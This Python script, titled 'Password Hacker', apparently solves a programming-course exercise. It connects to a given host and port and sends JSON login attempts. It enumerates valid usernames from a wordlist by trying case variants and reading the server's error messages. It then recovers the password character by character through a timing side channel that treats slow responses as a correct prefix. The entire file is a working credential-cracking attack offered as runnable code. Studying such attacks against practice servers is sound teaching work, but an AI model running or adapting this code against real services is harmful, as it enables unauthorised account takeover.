# Password Hacker

import socket
import sys
import itertools
import json
import string
from datetime import datetime


class PasswordHacker:

    def __init__(self, hostname, port):
        self.client_socket = self.socket_connection(hostname, int(port))

    @staticmethod
    def socket_connection(hostname, port):
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((hostname, port))
        return client_socket

    @staticmethod
    def login_comb(dict_login):
        for letter in itertools.product(*([letter.lower(), letter.upper()] for letter in dict_login)):
            yield ''.join(letter)

    @staticmethod
    def login_list():
        username_list = []
        with open('/home/tetra/Downloads/logins.txt', 'r') as f:
            for i in f.readlines():
                username_list.append(i.rstrip())
        return username_list

    def check_login_only(self, login):
        login_only = {"login": login, "password": ' '}
        json_login_only = json.dumps(login_only)
        self.client_socket.send(json_login_only.encode())
        response = self.client_socket.recv(1024)
        re = json.loads(response.decode())
        result = re['result']
        if result == 'Wrong login!':
            return False
        elif result == 'Wrong password!':
            return True

    def check_login_password(self, username, password):
        login_password = {"login": username, "password": password}
        json_login_pass = json.dumps(login_password)

        start = datetime.now()
        self.client_socket.send(json_login_pass.encode())
        response = self.client_socket.recv(1024)
        finish = datetime.now()

        re = json.loads(response.decode())
        result = re['result']
        difference = finish - start
        if difference.microseconds > 90000:
            return 'Exception'
        if result == 'Wrong password!':
            return False
        elif result == 'Connection success!':
            return True

    def try_login_only(self):
        # login-list
        login_lst = self.login_list()
        for login_word in login_lst:
            login_gen = self.login_comb(login_word)
            check_login = True
            while check_login:
                try:
                    login = next(login_gen)
                    if self.check_login_only(login):
                        return login
                except StopIteration:
                    check_login = False

    def try_login_password(self, login):
        pass_append = ''
        pass_true = False
        while pass_true is not True:
            num_alpha = string.digits + string.ascii_letters
            for letter in num_alpha:
                for case_letter in [letter.upper(), letter.lower()]:
                    pass_append += case_letter
                    result = self.check_login_password(login, pass_append)
                    if result == 'Exception':
                        # print(pass_append)
                        continue
                    elif result is True:
                        return pass_append
                    elif result is False:
                        pass_append = pass_append[:-1]
                        continue

    def try_brute_force(self):
        login_id = self.try_login_only()
        password = self.try_login_password(login_id)
        correct_login_password = {'login': login_id, 'password': password}
        json_result = json.dumps(correct_login_password, indent=4)
        print(json_result)


# Run
def main():
    hostname = sys.argv[1]
    port = sys.argv[2]
    passwordHacker = PasswordHacker(hostname, port)
    passwordHacker.try_brute_force()


if __name__ == '__main__':
    main()
